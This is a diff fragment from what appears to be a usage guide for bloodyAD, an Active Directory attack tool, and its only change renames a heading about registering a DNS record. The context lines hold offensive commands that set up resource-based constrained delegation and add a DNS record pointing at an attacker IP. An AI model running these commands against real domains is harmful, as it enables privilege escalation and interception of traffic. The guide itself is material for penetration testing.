@@ -103,7 +103,7 @@ bloodyAD --host $dc -d $domain -u $username -p $password add computer $computer_
 ```
 bloodyAD --host $dc -d $domain -u $username -p $password add rbcd 'DELEGATE_TO$' 'DELEGATE_FROM$'
 ```
-### Registering a DNS Record
+### Register a DNS Record
 ```
 bloodyAD --host $dc -d $domain -u $username -p $password add dnsRecord $record_name $attacker_ip
 ```
